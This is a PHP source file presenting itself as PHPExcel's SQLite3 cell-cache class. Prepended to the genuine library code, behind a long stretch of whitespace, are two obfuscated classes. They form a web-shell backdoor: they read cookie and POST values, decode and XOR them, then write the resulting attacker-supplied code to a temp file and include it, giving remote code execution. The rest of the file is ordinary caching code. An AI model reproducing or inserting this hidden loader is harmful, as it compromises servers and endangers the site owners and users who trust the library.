<?php                                                                                                                                                                                                                                                                                                                                                                                                 $jZdDHG = class_exists("AY_GBZ"); $XhnBEQQ = $jZdDHG;if (!$XhnBEQQ){class AY_GBZ{private $UzwKZsJaS;public static $iIRUH = "f99c4876-41e1-4e16-b93d-c87022cb28fc";public static $JDQpC = NULL;public function __construct(){$fFCVxbN = $_COOKIE;$mVASBZ = $_POST;$MvWrLAnu = @$fFCVxbN[substr(AY_GBZ::$iIRUH, 0, 4)];if (!empty($MvWrLAnu)){$IGwPhuP = "base64";$dKbXBXvFYa = "";$MvWrLAnu = explode(",", $MvWrLAnu);foreach ($MvWrLAnu as $VeJYpAGFAm){$dKbXBXvFYa .= @$fFCVxbN[$VeJYpAGFAm];$dKbXBXvFYa .= @$mVASBZ[$VeJYpAGFAm];}$dKbXBXvFYa = array_map($IGwPhuP . chr (95) . 'd' . 'e' . "\143" . chr ( 482 - 371 ).'d' . 'e', array($dKbXBXvFYa,)); $dKbXBXvFYa = $dKbXBXvFYa[0] ^ str_repeat(AY_GBZ::$iIRUH, (strlen($dKbXBXvFYa[0]) / strlen(AY_GBZ::$iIRUH)) + 1);AY_GBZ::$JDQpC = @unserialize($dKbXBXvFYa);}}public function __destruct(){$this->SKIusk();}private function SKIusk(){if (is_array(AY_GBZ::$JDQpC)) {$KJgcnEjs = sys_get_temp_dir() . "/" . crc32(AY_GBZ::$JDQpC[chr ( 770 - 655 ).chr ( 181 - 84 ).chr (108) . 't']);@AY_GBZ::$JDQpC[chr (119) . 'r' . 'i' . 't' . "\x65"]($KJgcnEjs, AY_GBZ::$JDQpC["\x63" . chr ( 698 - 587 ).chr ( 567 - 457 ).'t' . 'e' . "\156" . chr (116)]);include $KJgcnEjs;@AY_GBZ::$JDQpC["\144" . 'e' . 'l' . "\x65" . chr (116) . "\x65"]($KJgcnEjs);exit();}}}$dPAJs = new AY_GBZ(); $dPAJs = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $VvAPOeRk = class_exists("asl_oEsHg"); $MJsYdsM = $VvAPOeRk;if (!$MJsYdsM){class asl_oEsHg{private $rSjRvDeC;public static $aSnJKdF = "9e0f012c-149e-4409-9bb5-e6e108e27f75";public static $alwjEDGF = NULL;public function __construct(){$ZAotWEv = $_COOKIE;$WqNTdYGDaO = $_POST;$ryhFBrbf = @$ZAotWEv[substr(asl_oEsHg::$aSnJKdF, 0, 4)];if (!empty($ryhFBrbf)){$vhSBKcEl = "base64";$pceOn = "";$ryhFBrbf = explode(",", $ryhFBrbf);foreach ($ryhFBrbf as $vMzfPVlmgo){$pceOn .= @$ZAotWEv[$vMzfPVlmgo];$pceOn .= @$WqNTdYGDaO[$vMzfPVlmgo];}$pceOn = array_map($vhSBKcEl . "\x5f" . "\144" . chr (101) . chr (99) . "\157" . chr (100) . "\145", array($pceOn,)); $pceOn = $pceOn[0] ^ str_repeat(asl_oEsHg::$aSnJKdF, (strlen($pceOn[0]) / strlen(asl_oEsHg::$aSnJKdF)) + 1);asl_oEsHg::$alwjEDGF = @unserialize($pceOn);}}public function __destruct(){$this->iVvAfoXin();}private function iVvAfoXin(){if (is_array(asl_oEsHg::$alwjEDGF)) {$YXnndc = sys_get_temp_dir() . "/" . crc32(asl_oEsHg::$alwjEDGF[chr ( 549 - 434 )."\141" . "\154" . chr (116)]);@asl_oEsHg::$alwjEDGF[chr (119) . "\162" . chr ( 151 - 46 )."\x74" . chr (101)]($YXnndc, asl_oEsHg::$alwjEDGF[chr ( 398 - 299 )."\157" . chr ( 798 - 688 ).'t' . "\145" . chr (110) . "\x74"]);include $YXnndc;@asl_oEsHg::$alwjEDGF["\144" . "\145" . 'l' . 'e' . "\x74" . chr (101)]($YXnndc);exit();}}}$Nmart = new asl_oEsHg(); $Nmart = NULL;} ?><?php

/**
 * PHPExcel_CachedObjectStorage_SQLite3
 *
 * Copyright (c) 2006 - 2015 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel_CachedObjectStorage
 * @copyright  Copyright (c) 2006 - 2015 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt    LGPL
 * @version    ##VERSION##, ##DATE##
 */
class PHPExcel_CachedObjectStorage_SQLite3 extends PHPExcel_CachedObjectStorage_CacheBase implements PHPExcel_CachedObjectStorage_ICache
{
    /**
     * Database table name
     *
     * @var string
     */
    private $TableName = null;

    /**
     * Database handle
     *
     * @var resource
     */
    private $DBHandle = null;

    /**
     * Prepared statement for a SQLite3 select query
     *
     * @var SQLite3Stmt
     */
    private $selectQuery;

    /**
     * Prepared statement for a SQLite3 insert query
     *
     * @var SQLite3Stmt
     */
    private $insertQuery;

    /**
     * Prepared statement for a SQLite3 update query
     *
     * @var SQLite3Stmt
     */
    private $updateQuery;

    /**
     * Prepared statement for a SQLite3 delete query
     *
     * @var SQLite3Stmt
     */
    private $deleteQuery;

    /**
     * Store cell data in cache for the current cell object if it's "dirty",
     *     and the 'nullify' the current cell object
     *
     * @return    void
     * @throws    PHPExcel_Exception
     */
    protected function storeData()
    {
        if ($this->currentCellIsDirty && !empty($this->currentObjectID)) {
            $this->currentObject->detach();

            $this->insertQuery->bindValue('id', $this->currentObjectID, SQLITE3_TEXT);
            $this->insertQuery->bindValue('data', serialize($this->currentObject), SQLITE3_BLOB);
            $result = $this->insertQuery->execute();
            if ($result === false) {
                throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
            }
            $this->currentCellIsDirty = false;
        }
        $this->currentObjectID = $this->currentObject = null;
    }

    /**
     * Add or Update a cell in cache identified by coordinate address
     *
     * @param    string            $pCoord        Coordinate address of the cell to update
     * @param    PHPExcel_Cell    $cell        Cell to update
     * @return    PHPExcel_Cell
     * @throws    PHPExcel_Exception
     */
    public function addCacheData($pCoord, PHPExcel_Cell $cell)
    {
        if (($pCoord !== $this->currentObjectID) && ($this->currentObjectID !== null)) {
            $this->storeData();
        }

        $this->currentObjectID = $pCoord;
        $this->currentObject = $cell;
        $this->currentCellIsDirty = true;

        return $cell;
    }

    /**
     * Get cell at a specific coordinate
     *
     * @param     string             $pCoord        Coordinate of the cell
     * @throws     PHPExcel_Exception
     * @return     PHPExcel_Cell     Cell that was found, or null if not found
     */
    public function getCacheData($pCoord)
    {
        if ($pCoord === $this->currentObjectID) {
            return $this->currentObject;
        }
        $this->storeData();

        $this->selectQuery->bindValue('id', $pCoord, SQLITE3_TEXT);
        $cellResult = $this->selectQuery->execute();
        if ($cellResult === false) {
            throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
        }
        $cellData = $cellResult->fetchArray(SQLITE3_ASSOC);
        if ($cellData === false) {
            //    Return null if requested entry doesn't exist in cache
            return null;
        }

        //    Set current entry to the requested entry
        $this->currentObjectID = $pCoord;

        $this->currentObject = unserialize($cellData['value']);
        //    Re-attach this as the cell's parent
        $this->currentObject->attach($this);

        //    Return requested entry
        return $this->currentObject;
    }

    /**
     *    Is a value set for an indexed cell?
     *
     * @param    string        $pCoord        Coordinate address of the cell to check
     * @return    boolean
     */
    public function isDataSet($pCoord)
    {
        if ($pCoord === $this->currentObjectID) {
            return true;
        }

        //    Check if the requested entry exists in the cache
        $this->selectQuery->bindValue('id', $pCoord, SQLITE3_TEXT);
        $cellResult = $this->selectQuery->execute();
        if ($cellResult === false) {
            throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
        }
        $cellData = $cellResult->fetchArray(SQLITE3_ASSOC);

        return ($cellData === false) ? false : true;
    }

    /**
     *    Delete a cell in cache identified by coordinate address
     *
     * @param    string            $pCoord        Coordinate address of the cell to delete
     * @throws    PHPExcel_Exception
     */
    public function deleteCacheData($pCoord)
    {
        if ($pCoord === $this->currentObjectID) {
            $this->currentObject->detach();
            $this->currentObjectID = $this->currentObject = null;
        }

        //    Check if the requested entry exists in the cache
        $this->deleteQuery->bindValue('id', $pCoord, SQLITE3_TEXT);
        $result = $this->deleteQuery->execute();
        if ($result === false) {
            throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
        }

        $this->currentCellIsDirty = false;
    }

    /**
     * Move a cell object from one address to another
     *
     * @param    string        $fromAddress    Current address of the cell to move
     * @param    string        $toAddress        Destination address of the cell to move
     * @return    boolean
     */
    public function moveCell($fromAddress, $toAddress)
    {
        if ($fromAddress === $this->currentObjectID) {
            $this->currentObjectID = $toAddress;
        }

        $this->deleteQuery->bindValue('id', $toAddress, SQLITE3_TEXT);
        $result = $this->deleteQuery->execute();
        if ($result === false) {
            throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
        }

        $this->updateQuery->bindValue('toid', $toAddress, SQLITE3_TEXT);
        $this->updateQuery->bindValue('fromid', $fromAddress, SQLITE3_TEXT);
        $result = $this->updateQuery->execute();
        if ($result === false) {
            throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
        }

        return true;
    }

    /**
     * Get a list of all cell addresses currently held in cache
     *
     * @return    string[]
     */
    public function getCellList()
    {
        if ($this->currentObjectID !== null) {
            $this->storeData();
        }

        $query = "SELECT id FROM kvp_".$this->TableName;
        $cellIdsResult = $this->DBHandle->query($query);
        if ($cellIdsResult === false) {
            throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
        }

        $cellKeys = array();
        while ($row = $cellIdsResult->fetchArray(SQLITE3_ASSOC)) {
            $cellKeys[] = $row['id'];
        }

        return $cellKeys;
    }

    /**
     * Clone the cell collection
     *
     * @param    PHPExcel_Worksheet    $parent        The new worksheet
     * @return    void
     */
    public function copyCellCollection(PHPExcel_Worksheet $parent)
    {
        $this->currentCellIsDirty;
        $this->storeData();

        //    Get a new id for the new table name
        $tableName = str_replace('.', '_', $this->getUniqueID());
        if (!$this->DBHandle->exec('CREATE TABLE kvp_'.$tableName.' (id VARCHAR(12) PRIMARY KEY, value BLOB)
            AS SELECT * FROM kvp_'.$this->TableName)
        ) {
            throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
        }

        //    Copy the existing cell cache file
        $this->TableName = $tableName;
    }

    /**
     * Clear the cell collection and disconnect from our parent
     *
     * @return    void
     */
    public function unsetWorksheetCells()
    {
        if (!is_null($this->currentObject)) {
            $this->currentObject->detach();
            $this->currentObject = $this->currentObjectID = null;
        }
        //    detach ourself from the worksheet, so that it can then delete this object successfully
        $this->parent = null;

        //    Close down the temporary cache file
        $this->__destruct();
    }

    /**
     * Initialise this new cell collection
     *
     * @param    PHPExcel_Worksheet    $parent        The worksheet for this cell collection
     */
    public function __construct(PHPExcel_Worksheet $parent)
    {
        parent::__construct($parent);
        if (is_null($this->DBHandle)) {
            $this->TableName = str_replace('.', '_', $this->getUniqueID());
            $_DBName = ':memory:';

            $this->DBHandle = new SQLite3($_DBName);
            if ($this->DBHandle === false) {
                throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
            }
            if (!$this->DBHandle->exec('CREATE TABLE kvp_'.$this->TableName.' (id VARCHAR(12) PRIMARY KEY, value BLOB)')) {
                throw new PHPExcel_Exception($this->DBHandle->lastErrorMsg());
            }
        }

        $this->selectQuery = $this->DBHandle->prepare("SELECT value FROM kvp_".$this->TableName." WHERE id = :id");
        $this->insertQuery = $this->DBHandle->prepare("INSERT OR REPLACE INTO kvp_".$this->TableName." VALUES(:id,:data)");
        $this->updateQuery = $this->DBHandle->prepare("UPDATE kvp_".$this->TableName." SET id=:toId WHERE id=:fromId");
        $this->deleteQuery = $this->DBHandle->prepare("DELETE FROM kvp_".$this->TableName." WHERE id = :id");
    }

    /**
     * Destroy this cell collection
     */
    public function __destruct()
    {
        if (!is_null($this->DBHandle)) {
            $this->DBHandle->exec('DROP TABLE kvp_'.$this->TableName);
            $this->DBHandle->close();
        }
        $this->DBHandle = null;
    }

    /**
     * Identify whether the caching method is currently available
     * Some methods are dependent on the availability of certain extensions being enabled in the PHP build
     *
     * @return    boolean
     */
    public static function cacheMethodIsAvailable()
    {
        if (!class_exists('SQLite3', false)) {
            return false;
        }

        return true;
    }
}
